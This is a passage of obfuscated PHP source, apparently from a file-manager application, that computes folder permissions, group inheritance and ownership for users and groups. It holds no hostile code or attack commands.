unset($çÙÈÏ£¾[$Ê„ªûÇÉ[536]]); unset($çÙÈÏ£¾[$Ê„ªûÇÉ[496]]); unset($çÙÈÏ£¾[$Ê„ªûÇÉ[90]]); $ñĞ³ø¤Å = $‡ıŸàè[$çÙÈÏ£¾[$Ê„ªûÇÉ[193]]]; if (!$ñĞ³ø¤Å) { continue; } $çÙÈÏ£¾[$Ê„ªûÇÉ[2157]] = $this->authTargetInfo($ñĞ³ø¤Å); $çÙÈÏ£¾[$Ê„ªûÇÉ[591]] = rtrim($çÙÈÏ£¾[$Ê„ªûÇÉ[597]], $Ê„ªûÇÉ[8]) . $Ê„ªûÇÉ[8] . ltrim($çÙÈÏ£¾[$Ê„ªûÇÉ[591]], $Ê„ªûÇÉ[8]); $‘ûäìÛ‹[] = $çÙÈÏ£¾; $á†³˜ß® = count(explode($Ê„ªûÇÉ[8], trim($çÙÈÏ£¾[$Ê„ªûÇÉ[591]], $Ê„ªûÇÉ[8]))); $Üı“†ù£[] = $á†³˜ß® + ($çÙÈÏ£¾[$Ê„ªûÇÉ[33]] == $Ê„ªûÇÉ[78] ? 0 : 1000); } array_multisort($Üı“†ù£, SORT_ASC, $‘ûäìÛ‹); return $‘ûäìÛ‹; } private function groupChidldAllRootSource($õš÷›üÏ) { $öœìèÛÁ =& $_SERVER[ç¦¬”œš]; $üßŠ¦¿ = Model($öœìèÛÁ[2158])->groupChildrenAll($õš÷›üÏ); $û¸‡¹Ú¦ = array($öœìèÛÁ[192] => 0, $öœìèÛÁ[578] => array($öœìèÛÁ[7], $üßŠ¦¿), $öœìèÛÁ[190] => SourceModel::TYPE_GROUP); $ãıÑ”ì£ = Model($öœìèÛÁ[904])->field($öœìèÛÁ[193])->where($û¸‡¹Ú¦)->select(); $ãıÑ”ì£ = array_to_keyvalue($ãıÑ”ì£, $öœìèÛÁ[12], $öœìèÛÁ[193]); return $ãıÑ”ì£; } private function authTargetInfo($¼œ¶§––) { $¥ê¿Ï—â =& $_SERVER[ç¦¬”œš]; $«¯ƒº‰Ê = array(); $Ûáßû÷ = array(); $¯á”ø¼ = 2 << 25; foreach ($¼œ¶§–– as $Îü„¦) { $æÉªÉ² = Model($¥ê¿Ï—â[580])->listData($Îü„¦[$¥ê¿Ï—â[2077]]); if (!$æÉªÉ²) { continue; } if ($Îü„¦[$¥ê¿Ï—â[190]] == SourceModel::TYPE_USER) { $šº‰½ÒÚ = Model($¥ê¿Ï—â[586])->getInfoSimpleOuter($Îü„¦[$¥ê¿Ï—â[578]]); if ($šº‰½ÒÚ[$¥ê¿Ï—â[1770]] == $¥ê¿Ï—â[1274]) { continue; } if ($šº‰½ÒÚ[$¥ê¿Ï—â[1770]] == $¥ê¿Ï—â[228]) { $šº‰½ÒÚ[$¥ê¿Ï—â[32]] = LNG($¥ê¿Ï—â[2159]); } } else { $šº‰½ÒÚ = Model($¥ê¿Ï—â[594])->getInfoSimple($Îü„¦[$¥ê¿Ï—â[578]]); } if (!$šº‰½ÒÚ) { continue; } $šº‰½ÒÚ[$¥ê¿Ï—â[549]] = $æÉªÉ²; $«¯ƒº‰Ê[] = $šº‰½ÒÚ; $Üîõğ‰× = 0; if ($Îü„¦[$¥ê¿Ï—â[190]] == SourceModel::TYPE_GROUP) { $Üîõğ‰× = $¯á”ø¼ * 2; } if ($Îü„¦[$¥ê¿Ï—â[190]] == SourceModel::TYPE_USER) { $Üîõğ‰× = $¯á”ø¼; } if ($Îü„¦[$¥ê¿Ï—â[190]] == SourceModel::TYPE_USER && $Îü„¦[$¥ê¿Ï—â[578]] == $¥ê¿Ï—â[228]) { $Üîõğ‰× = 0; } $Ûáßû÷[] = $æÉªÉ²[$¥ê¿Ï—â[496]] + $Üîõğ‰×; } array_multisort($Ûáßû÷, SORT_DESC, $«¯ƒº‰Ê); return $«¯ƒº‰Ê; } public function getAllChildrenByUser($·š†ª¼î, $¯Â§¼ìƒ) { $ŒÀ£®™ğ =& $_SERVER[ç¦¬”œš]; $Õı´Ê‡ = Model($ŒÀ£®™ğ[607])->getInfo($¯Â§¼ìƒ); if (!$¯Â§¼ìƒ || !$·š†ª¼î || !$Õı´Ê‡) { return array(); } $õ·±¶åª = Model($ŒÀ£®™ğ[1419])->sourceInfo($·š†ª¼î); $Ë¿ÜõËÃ = array(); $¸ã¾÷ªæ = 1; if ($õ·±¶åª[$ŒÀ£®™ğ[192]] == $ŒÀ£®™ğ[228] && $õ·±¶åª[$ŒÀ£®™ğ[578]] != $¸ã¾÷ªæ && $this->groupContainUser($õ·±¶åª[$ŒÀ£®™ğ[578]], $¯Â§¼ìƒ)) { foreach ($Õı´Ê‡[$ŒÀ£®™ğ[2160]] as $¹ååôõê) { $Òœ³¢ùË = Model($ŒÀ£®™ğ[594])->getInfo($¹ååôõê[$ŒÀ£®™ğ[1969]]); $ÛçËĞ° = Model($ŒÀ£®™ğ[607])->getInfoSimpleOuter($¯Â§¼ìƒ); $ÛçËĞ°[$ŒÀ£®™ğ[549]] = $¹ååôõê[$ŒÀ£®™ğ[496]]; if (Model($ŒÀ£®™ğ[580])->authCheckAction($¹ååôõê[$ŒÀ£®™ğ[496]][$ŒÀ£®™ğ[496]], $ŒÀ£®™ğ[1990])) { continue; } $Ô¯ø›Ç­ = array($ŒÀ£®™ğ[32] => $ŒÀ£®™ğ[1294] . $Òœ³¢ùË[$ŒÀ£®™ğ[32]], $ŒÀ£®™ğ[193] => $Òœ³¢ùË[$ŒÀ£®™ğ[90]][$ŒÀ£®™ğ[193]], $ŒÀ£®™ğ[87] => KodIO::make($Òœ³¢ùË[$ŒÀ£®™ğ[90]][$ŒÀ£®™ğ[193]]), $ŒÀ£®™ğ[192] => $ŒÀ£®™ğ[228], $ŒÀ£®™ğ[190] => $ŒÀ£®™ğ[587], $ŒÀ£®™ğ[33] => $ŒÀ£®™ğ[625], $ŒÀ£®™ğ[591] => $Òœ³¢ùË[$ŒÀ£®™ğ[598]], $ŒÀ£®™ğ[1969] => $Òœ³¢ùË[$ŒÀ£®™ğ[1969]], $ŒÀ£®™ğ[595] => $Òœ³¢ùË[$ŒÀ£®™ğ[192]], $ŒÀ£®™ğ[2157] => array($ÛçËĞ°)); $Ë¿ÜõËÃ[$Ô¯ø›Ç­[$ŒÀ£®™ğ[193]]] = $Ô¯ø›Ç­; } } $ü±‘™²‰ = array(); $¾òË®ñ = $this->getAllChildren($·š†ª¼î); foreach ($¾òË®ñ as $–â¬Âë) { $·Íş¨åÍ = !1; foreach ($–â¬Âë[$ŒÀ£®™ğ[2157]] as $–Â³£¹ª) { if ($–Â³£¹ª[$ŒÀ£®™ğ[1770]]) { if ($–Â³£¹ª[$ŒÀ£®™ğ[1770]] == $¯Â§¼ìƒ) { $·Íş¨åÍ = !0; break; } } if ($–Â³£¹ª[$ŒÀ£®™ğ[1969]]) { if ($this->groupContainUser($–Â³£¹ª[$ŒÀ£®™ğ[1969]], $¯Â§¼ìƒ)) { $·Íş¨åÍ = !0; break; } } } if ($·Íş¨åÍ) { $ü±‘™²‰[] = $–â¬Âë; } $°òüšò‚ = $–â¬Âë[$ŒÀ£®™ğ[193]]; if (isset($Ë¿ÜõËÃ[$°òüšò‚])) { $–â¬Âë[$ŒÀ£®™ğ[2157]][] = $Ë¿ÜõËÃ[$°òüšò‚][0]; $Ë¿ÜõËÃ[$°òüšò‚] = !1; } } $Ë¿ÜõËÃ = array_filter(array_values($Ë¿ÜõËÃ)); $ü±‘™²‰ = array_merge($Ë¿ÜõËÃ, $ü±‘™²‰); return $ü±‘™²‰; } public function setAllChildrenByUser($Š¨º¾·, $³åĞı¸, $“Ó˜«¿) { $¹”õ¨Ù =& $_SERVER[ç¦¬”œš]; $««¯Ôöµ = $this->getAllChildrenByUser($Š¨º¾·, $³åĞı¸); if (!$“Ó˜«¿ || !$««¯Ôöµ) { return !1; } foreach ($««¯Ôöµ as $Şáæ¯¢) { $¶›®¢¥¦ = array(); foreach ($Şáæ¯¢[$¹”õ¨Ù[2157]] as $æ‹ñ  é) { $Õ—öäÏš = $æ‹ñ  é[$¹”õ¨Ù[549]]; $•õæáè‘ = $æ‹ñ  é[$¹”õ¨Ù[1770]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $Şƒ×âÉ¢ = $æ‹ñ  é[$¹”õ¨Ù[1770]] ? $æ‹ñ  é[$¹”õ¨Ù[1770]] : $æ‹ñ  é[$¹”õ¨Ù[1969]]; if ($æ‹ñ  é[$¹”õ¨Ù[1770]] && $æ‹ñ  é[$¹”õ¨Ù[1770]] == $³åĞı¸) { continue; } $¶›®¢¥¦[] = array($¹”õ¨Ù[193] => $Şáæ¯¢[$¹”õ¨Ù[193]], $¹”õ¨Ù[190] => $•õæáè‘, $¹”õ¨Ù[578] => intval($Şƒ×âÉ¢), $¹”õ¨Ù[2077] => isset($Õ—öäÏš[$¹”õ¨Ù[484]]) ? intval($Õ—öäÏš[$¹”õ¨Ù[484]]) : 0, $¹”õ¨Ù[2137] => isset($Õ—öäÏš[$¹”õ¨Ù[2137]]) ? intval($Õ—öäÏš[$¹”õ¨Ù[2137]]) : -1); } $¶›®¢¥¦[] = array($¹”õ¨Ù[193] => $Şáæ¯¢[$¹”õ¨Ù[193]], $¹”õ¨Ù[190] => SourceModel::TYPE_USER, $¹”õ¨Ù[578] => intval($³åĞı¸), $¹”õ¨Ù[2077] => intval($“Ó˜«¿), $¹”õ¨Ù[2137] => -1); $this->where(array($¹”õ¨Ù[500] => $Şáæ¯¢[$¹”õ¨Ù[193]]))->delete(); $this->addAll($¶›®¢¥¦); } return !0; } public function get($şØä¼ñö) { $’´«±Ò± = $this->getSourceList(array($şØä¼ñö), !0); return $’´«±Ò±[0]; } public function getSourceList($€­ÇñŠë, $ç¸ñÃúü = false, $¯Û¼Ÿ— = false) { $Í‡™ıâÕ =& $_SERVER[ç¦¬”œš]; if (!$€­ÇñŠë) { return array(); } $­ŠÅ£ø¯ = Model($Í‡™ıâÕ[1419]); if (!$ç¸ñÃúü && count($€­ÇñŠë) == 1) { $ç¸ñÃúü = array(); $ç¸ñÃúü[$€­ÇñŠë[0]] = $­ŠÅ£ø¯->sourceInfo($€­ÇñŠë[0]); } if (!$ç¸ñÃúü) { $şË„Ë§Ì = array($Í‡™ıâÕ[500] => array($Í‡™ıâÕ[501], $€­ÇñŠë)); $ç¸ñÃúü = $­ŠÅ£ø¯->field($Í‡™ıâÕ[2161])->where($şË„Ë§Ì)->select(); $ç¸ñÃúü = array_to_keyvalue($ç¸ñÃúü, $Í‡™ıâÕ[193]); } $ùü–à“ = $€­ÇñŠë; foreach ($ç¸ñÃúü as $ÖŸÌœÔû => $§¡Ÿ˜ƒĞ) { $ºÅ¸‹à¸ = $­ŠÅ£ø¯->parentLevelArray($§¡Ÿ˜ƒĞ[$Í‡™ıâÕ[593]]); $ùü–à“ = array_merge($ùü–à“, array($ÖŸÌœÔû), array_reverse($ºÅ¸‹à¸)); } $ùü–à“ = array_values(array_unique($ùü–à“)); if (!$ùü–à“) { return array(); } $ğÅ¶·›Ï = $this->sourceAuthSelect($ùü–à“); $İö”Àç‚ = array(); foreach ($ùü–à“ as $±Ã¹¾½) { if (isset($ğÅ¶·›Ï[$±Ã¹¾½])) { $İö”Àç‚[$±Ã¹¾½] = $ğÅ¶·›Ï[$±Ã¹¾½]; } } $àÅÓÍ¤ = $this->userIsRoot($¯Û¼Ÿ—); $Œ©ÚºÈ = AuthModel::authAll(); $ù²Â–˜Ÿ = array($Í‡™ıâÕ[497] => $Œ©ÚºÈ, $Í‡™ıâÕ[2162] => array($Í‡™ıâÕ[502] => 0, $Í‡™ıâÕ[1975] => $Œ©ÚºÈ, $Í‡™ıâÕ[503] => LNG($Í‡™ıâÕ[2163]), $Í‡™ıâÕ[1992] => $Í‡™ıâÕ[2164])); $È€¨óÖ = array(); foreach ($ç¸ñÃúü as $±Ã¹¾½ => $†´™‰ø) { if ($àÅÓÍ¤ && $GLOBALS[$Í‡™ıâÕ[6]][$Í‡™ıâÕ[1988]]) { $È€¨óÖ[$±Ã¹¾½] = $ù²Â–˜Ÿ; continue; } $È€¨óÖ[$±Ã¹¾½] = $this->makeSourceAuth($†´™‰ø, $İö”Àç‚, $¯Û¼Ÿ—); } return $È€¨óÖ; } public function authDeepCheck($‘çÙâó, $•¡Ë¯€¶ = false) { $˜•áÍŠœ =& $_SERVER[ç¦¬”œš]; $•¡Ë¯€¶ = $•¡Ë¯€¶ ? $•¡Ë¯€¶ : USER_ID; $È¿é©™ë = $this->makeAuthDeep($•¡Ë¯€¶); if (!in_array($‘çÙâó, $È¿é©™ë[$˜•áÍŠœ[2165]])) { return !1; } $áşÇÚñƒ = array(); foreach ($È¿é©™ë[$˜•áÍŠœ[2166]] as $ÊÜ±ÄÍ => $áÜ‡åõÏ) { if (!in_array($‘çÙâó, $áÜ‡åõÏ)) { continue; } $áşÇÚñƒ[] = $ÊÜ±ÄÍ; } if (!$áşÇÚñƒ) { return !1; } $ğõ¬®× = $áşÇÚñƒ ? $áşÇÚñƒ[0] : $‘çÙâó; return array($˜•áÍŠœ[497] => -1, $˜•áÍŠœ[549] => array($˜•áÍŠœ[502] => $˜•áÍŠœ[1274], $˜•áÍŠœ[1975] => $˜•áÍŠœ[228], $˜•áÍŠœ[503] => LNG($˜•áÍŠœ[2167]), $˜•áÍŠœ[1992] => $˜•áÍŠœ[2168]), $˜•áÍŠœ[2169] => LNG($˜•áÍŠœ[2170]), $˜•áÍŠœ[2171] => $this->sourceAuthInfo($ğõ¬®×)); } protected function makeAuthDeep($·×ØñßŒ = false) { $ªÈú±·” =& $_SERVER[ç¦¬”œš]; static $ñ×æéÁã = array(); $·×ØñßŒ = $·×ØñßŒ ? $·×ØñßŒ : USER_ID; if (isset($ñ×æéÁã[$·×ØñßŒ])) { return $ñ×æéÁã[$·×ØñßŒ]; } $íŒ‘âæĞ = Model($ªÈú±·”[2172])->listData(); $Šµü’†½ = array(); foreach ($íŒ‘âæĞ as $ÄĞ‡³¾Š) { if ($ÄĞ‡³¾Š[$ªÈú±·”[496]] == 0 && $ÄĞ‡³¾Š[$ªÈú±·”[1991]] == $ªÈú±·”[91]) { $Šµü’†½[] = $ÄĞ‡³¾Š[$ªÈú±·”[484]]; } } $§ÄÒÆÉš = $this->userGroupParents($·×ØñßŒ); $€çÓ• = array($ªÈú±·”[190] => SourceModel::TYPE_USER, $ªÈú±·”[578] => $·×ØñßŒ); if ($§ÄÒÆÉš) { $€çÓ• = array(array($ªÈú±·”[190] => SourceModel::TYPE_USER, $ªÈú±·”[578] => $·×ØñßŒ), array($ªÈú±·”[190] => SourceModel::TYPE_GROUP, $ªÈú±·”[578] => array($ªÈú±·”[501], $§ÄÒÆÉš)), $ªÈú±·”[1079] => $ªÈú±·”[2071]); } $”ù¾Ëö™ = $this->field($ªÈú±·”[2173])->where($€çÓ•)->select(); $•¡Ô¬Ã = array(); $¿¹úú¦ = array_to_keyvalue_group($”ù¾Ëö™, $ªÈú±·”[193]); foreach ($¿¹úú¦ as $¸¡Àà‹Ñ => $Ğº¤ëŞÊ) { $ªô¤„¤Ÿ = $this->authArrayCheck($Ğº¤ëŞÊ, $·×ØñßŒ); if ($ªô¤„¤Ÿ[$ªÈú±·”[497]] > 0) { $•¡Ô¬Ã[] = $¸¡Àà‹Ñ . $ªÈú±·”[12]; } } if ($§ÄÒÆÉš) { $­¨ô§È = Model($ªÈú±·”[594]); foreach ($§ÄÒÆÉš as $Ÿ¤²ìüÀ) { $ğ²°¢™ = $­¨ô§È->getInfo($Ÿ¤²ìüÀ); if (!$ğ²°¢™ || !is_array($ğ²°¢™[$ªÈú±·”[90]])) { continue; } $•¡Ô¬Ã[] = $ğ²°¢™[$ªÈú±·”[90]][$ªÈú±·”[193]]; } } $·üœ©à = array(); $ÁèÙûê = $§ÄÒÆÉš; $İùÚ¡‘ñ = Model($ªÈú±·”[1419]); $­¨ô§È = Model($ªÈú±·”[594]); $¼İŸØÓ¥ = array(); $˜½ÚÉõ± = array(); $¤›¤óÕ´ = array(); $ß€Ïœ• = array(); if ($•¡Ô¬Ã) { $È‡¢„Çà = $İùÚ¡‘ñ->where(array($ªÈú±·”[193] => array($ªÈú±·”[501], $•¡Ô¬Ã)))->select(); foreach ($È‡¢„Çà as $ÅÕë²·È) { $‡™ÜŞ’ã = $İùÚ¡‘ñ->parentLevelArray($ÅÕë²·È[$ªÈú±·”[593]]); $·üœ©à = array_merge($·üœ©à, $‡™ÜŞ’ã); $ÁèÙûê[] = $ÅÕë²·È[$ªÈú±·”[578]]; $¼İŸØÓ¥[$ÅÕë²·È[$ªÈú±·”[193]]] = $‡™ÜŞ’ã; $˜½ÚÉõ±[$ÅÕë²·È[$ªÈú±·”[193]]] = $ÅÕë²·È[$ªÈú±·”[578]]; } } $ÁèÙûê = array_values(array_unique($ÁèÙûê)); $‚¡­¶Èí = $ÁèÙûê; foreach ($‚¡­¶Èí as $Ÿ¤²ìüÀ) { $ğ²°¢™ = $­¨ô§È->getInfo($Ÿ¤²ìüÀ); $‡™ÜŞ’ã = $İùÚ¡‘ñ->parentLevelArray($ğ²°¢™[$ªÈú±·”[593]]); $ÁèÙûê = array_merge($ÁèÙûê, $‡™ÜŞ’ã); } $ÁèÙûê = array_values(array_unique($ÁèÙûê)); foreach ($ÁèÙûê as $Ÿ¤²ìüÀ) { $ğ²°¢™ = $­¨ô§È->getInfo($Ÿ¤²ìüÀ); $·üœ©à[] = $ğ²°¢™[$ªÈú±·”[90]][$ªÈú±·”[193]]; $¤›¤óÕ´[$Ÿ¤²ìüÀ] = $ğ²°¢™[$ªÈú±·”[90]][$ªÈú±·”[193]]; $ß€Ïœ•[$Ÿ¤²ìüÀ] = $İùÚ¡‘ñ->parentLevelArray($ğ²°¢™[$ªÈú±·”[593]]); } foreach ($¼İŸØÓ¥ as $‡Î‹¿ùÊ => $¬Íï‡¾ë) { $˜Øı¯¯‚ = $˜½ÚÉõ±[$‡Î‹¿ùÊ]; if (!$˜Øı¯¯‚ || !$¤›¤óÕ´[$˜Øı¯¯‚]) { continue; } $µç®“»‡ = array(); foreach ($ß€Ïœ•[$˜Øı¯¯‚] as $Ÿ¤²ìüÀ) { $µç®“»‡[] = $¤›¤óÕ´[$Ÿ¤²ìüÀ]; } $¼İŸØÓ¥[$‡Î‹¿ùÊ] = array_merge($µç®“»‡, $¬Íï‡¾ë); } $·üœ©à = array_values(array_unique($·üœ©à)); $¨ÁÕ ¹¢ = array($ªÈú±·”[2165] => $·üœ©à, $ªÈú±·”[2166] => $¼İŸØÓ¥); $ñ×æéÁã[$·×ØñßŒ] = $¨ÁÕ ¹¢; return $¨ÁÕ ¹¢; } private function makeSourceAuth($¿€Úİ¾á, $óºàÍ¶Ä, $¢ç¹æ¾ã = false) { $äÀ¤Ş¾à =& $_SERVER[ç¦¬”œš]; $‰ù¯êµ = $äÀ¤Ş¾à[91]; $È˜Ò©È = $¿€Úİ¾á[$äÀ¤Ş¾à[578]]; $µ®¢†Ê = $¿€Úİ¾á[$äÀ¤Ş¾à[190]] == SourceModel::TYPE_GROUP; $ŞåÑªª = $µ®¢†Ê ? $this->groupRootAuth($È˜Ò©È, $¢ç¹æ¾ã) : !1; if ($ŞåÑªª && Model($äÀ¤Ş¾à[580])->authCheckAction($ŞåÑªª[$äÀ¤Ş¾à[496]], $äÀ¤Ş¾à[1990])) { return $this->groupAuthInfo($ŞåÑªª, $È˜Ò©È); } $­¿¸²˜ = Model($äÀ¤Ş¾à[1419])->parentLevelArray($¿€Úİ¾á[$äÀ¤Ş¾à[593]]); $­¿¸²˜ = array_merge(array($¿€Úİ¾á[$äÀ¤Ş¾à[193]]), array_reverse($­¿¸²˜)); $Ë…®ıÍ­ = !1; foreach ($­¿¸²˜ as $ÄÎ¥¶Ï×) { if (!isset($óºàÍ¶Ä[$ÄÎ¥¶Ï×])) { continue; } $Ëß¨Å§‹ = $this->authMake($óºàÍ¶Ä[$ÄÎ¥¶Ï×], $¢ç¹æ¾ã); if ($Ëß¨Å§‹[$äÀ¤Ş¾à[549]]) { $Ë…®ıÍ­ = $Ëß¨Å§‹; break; } } if (!$µ®¢†Ê) { return $Ë…®ıÍ­; } if (!$Ë…®ıÍ­ && $ŞåÑªª) { $Ë…®ıÍ­ = $this->groupAuthInfo($ŞåÑªª, $È˜Ò©È); } if (!$Ë…®ıÍ­) { $ ò‘Àû = Model($äÀ¤Ş¾à[594])->getInfo($È˜Ò©È); $ç˜ÛÛÖÒ = explode($äÀ¤Ş¾à[50], trim($ ò‘Àû[$äÀ¤Ş¾à[593]], $äÀ¤Ş¾à[50])); $ç˜ÛÛÖÒ = array_reverse($ç˜ÛÛÖÒ); foreach ($ç˜ÛÛÖÒ as $ƒ»¸¬‘µ) { if ($ƒ»¸¬‘µ == $äÀ¤Ş¾à[228] || $ƒ»¸¬‘µ == $‰ù¯êµ) { continue; } $†Ìïç”® = $this->groupRootAuth($ƒ»¸¬‘µ, $¢ç¹æ¾ã); if (!$†Ìïç”®) { continue; } $Ë…®ıÍ­ = $this->groupAuthInfo($†Ìïç”®, $ƒ»¸¬‘µ); break; } } if (!$Ë…®ıÍ­ || $Ë…®ıÍ­[$äÀ¤Ş¾à[497]] <= 0) { $¸º±ƒ‹ü = $this->authDeepCheck($¿€Úİ¾á[$äÀ¤Ş¾à[193]], $¢ç¹æ¾ã); if ($¸º±ƒ‹ü) { $Ë…®ıÍ­ = $¸º±ƒ‹ü; } } return $Ë…®ıÍ­; } private function userIsRoot($ç¯ÌÅ¯¡ = false) { $‡¥¨—‰æ =& $_SERVER[ç¦¬”œš]; if (!$ç¯ÌÅ¯¡ && KodUser::isRoot()) { return !0; } $½ÔÙì¶‰ = Model($‡¥¨—‰æ[607])->getInfo($ç¯ÌÅ¯¡); $…‹¬­§ó = Model($‡¥¨—‰æ[2174])->listData($½ÔÙì¶‰[$‡¥¨—‰æ[2175]]); if ($…‹¬­§ó && $…‹¬­§ó[$‡¥¨—‰æ[584]][$‡¥¨—‰æ[2176]] == 1) { return !0; } return !1; } private function sourceAuthInfo($Æ×¸Ä…Ø) { $Õñ¼­üÙ =& $_SERVER[ç¦¬”œš]; $ä•×§ = Model($Õñ¼­üÙ[1419]); $§–Ëé± = $ä•×§->sourceInfo($Æ×¸Ä…Ø); if (!$§–Ëé±) { return !1; } $ä•×§->groupPathDisplay($§–Ëé±); $èÔ‡Œ— = array($§–Ëé±); $èÔ‡Œ— = $ä•×§->_listAppendPath($èÔ‡Œ—); $§–Ëé± = $èÔ‡Œ—[0]; $û»ş¸ÅÃ = $§–Ëé±[$Õñ¼­üÙ[591]]; if (isset($§–Ëé±[$Õñ¼­üÙ[599]])) { $Ô×‹‰Ù÷ = explode($Õñ¼­üÙ[8], trim($§–Ëé±[$Õñ¼­üÙ[591]], $Õñ¼­üÙ[8])); array_shift($Ô×‹‰Ù÷); $û»ş¸ÅÃ = $§–Ëé±[$Õñ¼­üÙ[597]] . $Õñ¼­üÙ[2177] . implode($Õñ¼­üÙ[8], $Ô×‹‰Ù÷); } return array($Õñ¼­üÙ[503] => $§–Ëé±[$Õñ¼­üÙ[32]], $Õñ¼­üÙ[87] => KodIO::make($§–Ëé±[$Õñ¼­üÙ[193]]), $Õñ¼­üÙ[2178] => $û»ş¸ÅÃ); } private function groupAuthInfo($…ş××¶÷, $™ÆôŞıí) { $ŠÎĞøŠÑ =& $_SERVER[ç¦¬”œš]; $óË–·ñô = Model($ŠÎĞøŠÑ[594])->getInfo($™ÆôŞıí); return array($ŠÎĞøŠÑ[2179] => intval($…ş××¶÷[$ŠÎĞøŠÑ[496]]), $ŠÎĞøŠÑ[2162] => $…ş××¶÷, $ŠÎĞøŠÑ[2180] => LNG($ŠÎĞøŠÑ[2181]), $ŠÎĞøŠÑ[2171] => array($ŠÎĞøŠÑ[503] => $óË–·ñô[$ŠÎĞøŠÑ[32]], $ŠÎĞøŠÑ[87] => KodIO::make($óË–·ñô[$ŠÎĞøŠÑ[90]][$ŠÎĞøŠÑ[193]]), $ŠÎĞøŠÑ[2178] => $óË–·ñô[$ŠÎĞøŠÑ[598]])); } protected function groupRootAuth($Ëí›î”Æ, $ÆóãáÃ = false) { $í…ãç­ =& $_SERVER[ç¦¬”œš]; $ÆóãáÃ = $ÆóãáÃ ? $ÆóãáÃ : USER_ID; $ó«ßòÆ” = $ÆóãáÃ . $í…ãç­[2182] . $Ëí›î”Æ; static $ø¾Œ‘âå = array(); if (isset($ø¾Œ‘âå[$ó«ßòÆ”])) { return $ø¾Œ‘âå[$ó«ßòÆ”]; } $¹¶½´¢ = Model($í…ãç­[594])->getInfo($Ëí›î”Æ); $äí…±‡ = $this->userGroupList($ÆóãáÃ); $‹ã”Ÿ¤÷ = isset($äí…±‡[$Ëí›î”Æ]) ? $äí…±‡[$Ëí›î”Æ][$í…ãç­[496]] : !1; if ($‹ã”Ÿ¤÷ && Model($í…ãç­[580])->authCheckAction($‹ã”Ÿ¤÷[$í…ãç­[496]], $í…ãç­[1990])) { $ø¾Œ‘âå[$ó«ßòÆ”] = $‹ã”Ÿ¤÷; return $‹ã”Ÿ¤÷; } $¹¡Ø™î = $this->sourceAuthSelect($¹¶½´¢[$í…ãç­[90]][$í…ãç­[193]]); $°êìÍ„ = $¹¡Ø™î ? $this->authMake($¹¡Ø™î, $ÆóãáÃ) : !1; $ä·†í´† = $°êìÍ„ ? $°êìÍ„[$í…ãç­[549]] : !1; $ø¾Œ‘âå[$ó«ßòÆ”] = $ä·†í´† ? $ä·†í´† : $‹ã”Ÿ¤÷; return $ø¾Œ‘âå[$ó«ßòÆ”]; } public function authOwnerApply($ï÷­Øä½) { $¤Ö¯Ô‰ =& $_SERVER[ç¦¬”œš]; if (empty($ï÷­Øä½[$¤Ö¯Ô‰[496]]) || isset($ï÷­Øä½[$¤Ö¯Ô‰[2183]]) && $ï÷­Øä½[$¤Ö¯Ô‰[2183]]) { return $ï÷­Øä½; } if (AuthModel::authCheckRoot($ï÷­Øä½[$¤Ö¯Ô‰[496]][$¤Ö¯Ô‰[497]])) { return $ï÷­Øä½; } $ø¨¢¦¤û = Model($¤Ö¯Ô‰[1419])->parentLevelArray($ï÷­Øä½[$¤Ö¯Ô‰[593]]); $ø¨¢¦¤û = array_merge(array($ï÷­Øä½[$¤Ö¯Ô‰[193]]), array_reverse($ø¨¢¦¤û)); $¹áÀË¹Æ = $this->sourceAuthSelect($ø¨¢¦¤û); $ˆ©Ë‰³× = array(); $ÉñŒÖ÷° = array(); foreach ($¹áÀË¹Æ as $è¢í¿¤­ => $Î²ë¸) { $è½ï¹Õ± = $this->authFolderOwnerUser($Î²ë¸); $ˆ©Ë‰³×[$è¢í¿¤­] = $è½ï¹Õ±; $ÉñŒÖ÷° = array_merge($ÉñŒÖ÷°, $è½ï¹Õ±[$¤Ö¯Ô‰[671]]); if ($è½ï¹Õ±[$¤Ö¯Ô‰[2184]]) { break; } } if (count($ÉñŒÖ÷°) == 0) { $ÉñŒÖ÷° = $this->authFolderOwnerGroup($ï÷­Øä½[$¤Ö¯Ô‰[578]]); } $ÉñŒÖ÷° = array_unique($ÉñŒÖ÷°); if (AuthModel::authCheckRoot($ï÷­Øä½[$¤Ö¯Ô‰[496]][$¤Ö¯Ô‰[497]])) { $ÉñŒÖ÷°[] = USER_ID; } $ï÷­Øä½[$¤Ö¯Ô‰[496]][$¤Ö¯Ô‰[2185]] = Model($¤Ö¯Ô‰[586])->userListInfo($ÉñŒÖ÷°); return $ï÷­Øä½; } private function authFolderOwnerGroup($™•·Ğ›ß) { $ÑÃÌÖé =& $_SERVER[ç¦¬”œš]; $ı¸¦ŒÉ÷ = Model($ÑÃÌÖé[2063])->where(array($ÑÃÌÖé[1969] => $™•·Ğ›ß))->select(); $¯‘ï§« = array(); if (!$ı¸¦ŒÉ÷) { return $¯‘ï§«; } foreach ($ı¸¦ŒÉ÷ as $‚‡µäß) { $‚«ßÇôŞ = $this->authInfo($‚‡µäß); if (AuthModel::authCheckRoot($‚«ßÇôŞ[$ÑÃÌÖé[496]])) { $¯‘ï§«[] = $‚‡µäß[$ÑÃÌÖé[1770]]; } } return $¯‘ï§«; } private function authFolderOwnerUser($³¬˜Ã) { $”Ï«ê¦ğ =& $_SERVER[ç¦¬”œš]; $£‘äÊÎ = array(); $ıô³ÔĞ“ = !1; foreach ($³¬˜Ã as $‡ÈïËËè) { $Ì›‰ÉÁ• = $this->authInfo($‡ÈïËËè); if ($‡ÈïËËè[$”Ï«ê¦ğ[578]] == $”Ï«ê¦ğ[228]) { $ıô³ÔĞ“ = !0; } if ($‡ÈïËËè[$”Ï«ê¦ğ[190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Ì›‰ÉÁ•[$”Ï«ê¦ğ[496]])) { $£‘äÊÎ[] = $‡ÈïËËè[$”Ï«ê¦ğ[578]]; } } } return array($”Ï«ê¦ğ[671] => $£‘äÊÎ, $”Ï«ê¦ğ[2184] => $ıô³ÔĞ“); } public function authMake($•ùØ¨éÑ, $Ã”°ËÍ© = false) { $ô­üûšê =& $_SERVER[ç¦¬”œš]; $œÑ‘Ğí = $this->authArrayCheck($•ùØ¨éÑ, $Ã”°ËÍ©); if ($œÑ‘Ğí[$ô­üûšê[2186]]) { $œÑ‘Ğí[$ô­üûšê[2186]] = $this->sourceAuthInfo($œÑ‘Ğí[$ô­üûšê[2186]]); } return $œÑ‘Ğí; } public function authArrayCheck($ñŠ£º÷¿, $£äÏ˜‰ï = false) { $Ö€Ä§üè =& $_SERVER[ç¦¬”œš]; if (!$ñŠ£º÷¿) { return array($Ö€Ä§üè[497] => 0, $Ö€Ä§üè[549] => !1); } $£äÏ˜‰ï = $£äÏ˜‰ï ? 